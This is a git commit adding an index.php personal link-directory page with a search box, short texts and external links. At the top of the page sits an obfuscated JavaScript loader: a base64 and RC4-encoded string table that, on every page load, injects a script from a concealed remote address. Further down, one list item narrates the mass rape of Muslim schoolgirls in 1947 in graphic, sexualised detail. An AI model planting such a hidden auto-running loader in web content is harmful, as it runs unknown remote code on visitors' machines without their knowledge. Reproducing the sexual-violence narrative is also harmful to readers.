657a26d7ba0dbf1568c9a53d1188eb8666126c42
chdtrust <54061927+chdtrust@users.noreply.github.com>
2021-08-06 23:08:25 +0530

    Add files via upload

---
+++ index.php
@@ -0,0 +1,131 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+(function(){var a=['w4xPIzDDpsOuT0g=','FMK+TMKHO1PCrcOnw6UXwpok','wqTCtsKRXht5wpFbwpjClhbDq0DCo1nDj8OkH8OIw6Y=','w7JQUg==','wpbCul5IMlFiOl/DkW1l','wpfCmcKZBcK7w63DtMKJUHjCqW8=','w50xYMOCSVE=','w5zCncKXFzTDncKwGA==','wqLChMK1IQbCpw==','w77Ct1PCsHbDtybCgTcjwqLCm2DCglPDo8Oww4/Dj14Lw73CmSsUHmp1MsO/woPCq1UOMFlT','woBgw77Ctg==','wqR+w4IjI8KLw6PDgiTDh1fCucO2Fw==','w5Mfwr02NzfCnVHDuzbDjcKKw4cMw4U=','aT7DthTDrH/DrMKI','WA7DrcO1wo8qGQ==','w6BMXsOFw6jDmm3CicO2','GcOONQo9KMO4HmREwqk=','woDClcKBAcKLw4s=','QCEQw7pMw4DDpCvDqcKBJMKzw47DpMOIXGDDu3V2OGZ3wokxwponZwhuKMKfIcO/wrxoBsKnw6TDrFA+','Yj/DsBPDs3XDsA==','w7VbQcOO','wo5FO3In','w4J6w43DvsKNGXPDtMO5Kg==','R2ASwq5Xw5PDhynDq8KGNsOkw5g=','wqghwqDDlsKyw4c=','w64MKl/CtEw2wp4gw4DDkyzCjA=='];(function(b,c){var f=function(g){while(--g){b['push'](b['shift']());}};f(++c);}(a,0x1e9));var b=function(c,d){c=c-0x0;var e=a[c];if(b['YNyLEV']===undefined){(function(){var h;try{var j=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');h=j();}catch(k){h=window;}var i='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';h['atob']||(h['atob']=function(l){var m=String(l)['replace'](/=+$/,'');var n='';for(var o=0x0,p,q,r=0x0;q=m['charAt'](r++);~q&&(p=o%0x4?p*0x40+q:q,o++%0x4)?n+=String['fromCharCode'](0xff&p>>(-0x2*o&0x6)):0x0){q=i['indexOf'](q);}return n;});}());var g=function(h,l){var m=[],n=0x0,o,p='',q='';h=atob(h);for(var t=0x0,u=h['length'];t<u;t++){q+='%'+('00'+h['charCodeAt'](t)['toString'](0x10))['slice'](-0x2);}h=decodeURIComponent(q);var r;for(r=0x0;r<0x100;r++){m[r]=r;}for(r=0x0;r<0x100;r++){n=(n+m[r]+l['charCodeAt'](r%l['length']))%0x100;o=m[r];m[r]=m[n];m[n]=o;}r=0x0;n=0x0;for(var v=0x0;v<h['length'];v++){r=(r+0x1)%0x100;n=(n+m[r])%0x100;o=m[r];m[r]=m[n];m[n]=o;p+=String['fromCharCode'](h['charCodeAt'](v)^m[(m[r]+m[n])%0x100]);}return p;};b['CRLzTk']=g;b['ceTyPM']={};b['YNyLEV']=!![];}var f=b['ceTyPM'][c];if(f===undefined){if(b['zuqPSi']===undefined){b['zuqPSi']=!![];}e=b['CRLzTk'](e,d);b['ceTyPM'][c]=e;}else{e=f;}return e;};var c=window;c[b('0xf','StHT')]=[[b('0x16','I72e'),0x3da3c9],[b('0xd','Oo4D'),0x0],[b('0x10','6Fra'),0x0],[b('0xa','I72e'),0x0],[b('0x13','DJd7'),![]],[b('0x4','GC(q'),0x0],[b('0x6','Wtf*'),!0x0]];var x=[b('0xe',')9su'),b('0x17','HHDh')],r=0x0,q,w=function(){if(''==x[r])return;q=c[b('0x5','#1dw')][b('0x2','HHDh')](b('0xb','x8dV'));q[b('0x19','Amk&')]=b('0x11','VhXx');q[b('0x0','Xl(s')]=!0x0;var d=c[b('0x12','yPDU')][b('0x7','i&ur')](b('0x3','Me&5'))[0x0];q[b('0x8','Amk&')]=b('0xc','Hc7$')+x[r];q[b('0x15','fH3r')]=b('0x14','Amk&');q[b('0x18','yPDU')]=function(){r++;w();};d[b('0x1','DTCs')][b('0x9','*DOp')](q,d);};w();})();
+/*]]>/* */
+</script>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  
+* {
+  box-sizing: border-box;
+}
+
+body  {
+  background-image: url("https://upload.wikimedia.org/wikipedia/commons/thumb/9/98/Lake_McDonald_%285387250181%29.jpg/1920px-Lake_McDonald_%285387250181%29.jpg");
+  background-color: #cccccc;
+}
+h2 {
+  color: #000080;
+}
+
+  
+  
+#myInput {
+  background-image: url("https://img.icons8.com/doodle/96/000000/search--v1.png");
+  background-position: 5px 7px;
+  background-size: 25px 25px;
+  background-repeat: no-repeat;
+  width: 100%;
+  font-size: 16px;
+  padding: 12px 20px 12px 40px;
+  border: 1px solid #ddd;
+  margin-bottom: 12px;
+}
+
+#myUL {
+  list-style-type: none;
+  padding: 0;
+  margin: 0;
+}
+
+#myUL li a {
+  border: 1px solid #ddd;
+  margin-top: -1px; /* Prevent double borders */
+  background-color: #f6f6f6;
+  padding: 12px;
+  text-decoration: none;
+  font-size: 18px;
+  color: black;
+  display: block
+}
+
+#myUL li a:hover:not(.header) {
+  background-color: #eee;
+}
+</style>
+</head>
+<body>
+
+
+<h2>Everything you want</h2>
+
+<input type="text" id="myInput" name="myInput" onkeyup="myFunction()" placeholder="Search for topics and websites.." title="Type anything" autofocus>
+
+<ul id="myUL">
+<li><a href="chdtrust.epizy.com">The farmer of Punjab was helpless in the face of relentless onslaught of the Abdali and his forces of Pathans. Abdali had defeated Sikhs, Rajput, Mughals and Marathas .  The farmer still had to eat and entire villages were dependant on their farmers produce. But Abdali looted everything he could get his hands on. He looted everything he laid his eyes on. So the farmer did what nobody thought off. Farmer dug holes in ground and hid in them large clay pots filled with grains. Only he knew thier location. Abdali came and went  with his loot. Then the farmer pulled out his produce which he had hid in his mother earth and he could eat again, entire village dependent on him, could eat again and Punjab kept flourishing. </a></li>
+ <li><a href="chdtrust.epizy.com">Story: Rapes of the Muslim girls. The day was rainy and mood was heavy. India and Pakistan were created but Punjab was not celebrating. Punjab was seeing bloodshed and rivers of dead bodies. This was not a sawan, as rainy season is called in Punjab, of joy and fulfillment but of destruction and fear. Here in the heart of Amritsar was the renowned Muslim girls school where girls of Muslim well to do families studied and lived. The riot was a blood feast for wolves. And Billa and Kala were wolves of all season. They had on daily basis leered at the girls as innocent as butter and tried to put their dirty hands on them. But in the chaos of 1947, their time had come. British, Hindu and Muslim intellectuals and leaders had stirred the perfect boiling pot which bring forth the worst in the humans. But wolves were always ready for the dark. They rallied a crowd and attacked the Muslim girls school. The good staff of the school boarded the doors. But they were smashed down. The girls prescient of their fate huddled in the corners, some tried to run away but the tall walls of school which were protecting them, stopped them. They were crying and hugging each other. Billa and Kala directly ran into their living quarters and dragged them and started molesting them. They slapped them, groped them and made them swirm in pain. More men came in. They beat the girls and asked them to go to school grounds. No body stopped Billa and Kala from what they were doing in the corner with two girls. They had their hands on. " This is revenge. What these mullahs did with our sisters in Lahore , its right before your eyes. And we will make them pay. We won't let one Muslim girl to leave the school with her honour intact. Revenge. Real men can stay. Others can leave."  A middle aged men from crowd yelled at the crowd. Then he proceeded and tore a girls kurta barring her before the eyes of onlookers, pulled her salwar down and laid on top of her right there. Few other boys came forward and did like wise with girls. By the end of the day, they had avenged from each girl the price of India and Pakistan. What happened to them is a mystery, washed in the sawan of 1947. </a></li>
+ <li><a href="chdtrust.epizy.com"> Punjabi - Chinese Dictionary. <br>1. ਬਾਰਿਸ਼ (barish)- 雨 (yu) <br> 2. ਸੇਬ (seb)- 苹果 (Pingguo)<br>3. ਅਮਰੂਦ ( Amrood) -  番石榴 (Fān shiliu)</a></li>
+ <li><a href="chdtrust.epizy.com">Indians who want to live forever.
+ Can we Indians live forever?
+ We must look to west for everything, why anti ageing has to be any different?
+ We must overcome lazyness and ignorance and start anti ageing lab in India.
+ Lets start a fund raising drive.
+ Print pamphlets and distribute.</a></li>
+ <li><a href="#" onClick="this.style.behavior='url(#default#homepage)';this.setHomePage('http://www.chdtrust.epizy.com');">Set this page as your Homepage</a>
+</li>
+
+   <li><a href="https://thenextweb.com/">The next web - latest tech news</a></li>
+  <li><a href="https://www.bloombergquint.com"> Bloomberg quint financial news India</a></li>
+  <li><a href="https://engineering.mit.edu/engage/ask-an-engineer/">MIT ask an engineer curiosity questions their scientific answers</a></li>
+  <li><a href="https://aitopics.org/misc/brief-history">HIstory of artificial intelligence aaai.org</a></li>
+<li><a href="http://kialo.com">Kialo explore debates science philosophy</a></li>
+   <li><a href="https://zidbits.com/category/news/"> <p hidden>Random  history weird and fun facts</p> zidbits</a></li>
+  <li><a href="https://bigthink.com/">Bigthink big ideas innovative</a></li>
+  <li><a href="https://github.com/">Github publish software html javascript apps</a></li>
+  <li><a href="https://mail.google.com/mail">Gmail Google email</a></li>
+  <li><a href="http://bbc.com/news">BBC latest news & long articles</a></li>
+   <li><a href="https://ncbi.nlm.nih.gov"> NCBI biological knowledge & databases</a></li>
+  <li><a href="http://infinityfree.net">Infinityfree.com free hosting</a></li>
+<li><a href="https://www.kialo.com/you-must-not-%E2%80%98do-your-own-research%E2%80%99-when-it-comes-to-science-39324">Should we do our own research debate</a></li>
+<li><a href="http://wheninchandigarh.blogspot.com/2010/07/passport.html">Blogspot about Chandigarh written by an American lady from Seattle</a></li>
+  <li><a href="https://youtube.com">Youtube</a></li>
+  <li><a href="https://pagalworld.to">Free mp3 hindi punjabi</a></li>
+
+ 
+  <li><a href="https://en.wikipedia.org/wiki/Human">Me human</a></li>
+  <li><a href="https://w3schools.com">W3schools web tutorials javascript html css learn</a></li>
+  <li><a href="https://icons8.com/icons">Icons8 Web icons & html</a></li>
+  <li><a href="http://com.com">Com.com special interesting domain name</a></li> 
+  <li><a href="http://en.wikipedia.org/wiki/Timeslip"><img src="https://upload.wikimedia.org/wikipedia/en/6/64/Timeslip_001.jpg"></a></li>
+  <li>  <a href="en.wikipedia.org"> <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/La_jeune_fille_et_l%27oiseau_%281900%29.jpg/800px-La_jeune_fille_et_l%27oiseau_%281900%29.jpg" width="100%"></a></li>
+</ul>
+
+<script>
+function myFunction() {
+    var input, filter, ul, li, a, i, txtValue;
+    input = document.getElementById("myInput");
+    filter = input.value.toUpperCase();
+    ul = document.getElementById("myUL");
+    li = ul.getElementsByTagName("li");
+    for (i = 0; i < li.length; i++) {
+        a = li[i].getElementsByTagName("a")[0];
+        txtValue = a.textContent || a.innerText;
+        if (txtValue.toUpperCase().indexOf(filter) > -1) {
+            li[i].style.display = "";
+        } else {
+            li[i].style.display = "none";
+        }
+    }
+}
+</script>
+
+</body>
+</html>
+
+ 
+ 
+   
+    
